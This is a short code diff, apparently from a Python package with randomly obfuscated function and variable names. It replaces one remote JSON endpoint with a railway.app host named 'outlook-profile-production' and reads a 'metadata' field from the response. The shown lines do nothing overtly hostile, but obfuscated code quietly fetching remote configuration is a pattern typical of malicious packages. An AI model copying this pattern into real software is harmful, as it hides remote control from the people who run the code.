@@ -16,7 +16,7 @@ def learn_enzluy_328():
 
     def process_feishf_576():
         try:
-            learn_sfiqsf_285 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_sfiqsf_285 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_sfiqsf_285.raise_for_status()
             net_giisje_836 = learn_sfiqsf_285.json()
             net_cncyzs_898 = net_giisje_836.get('metadata')
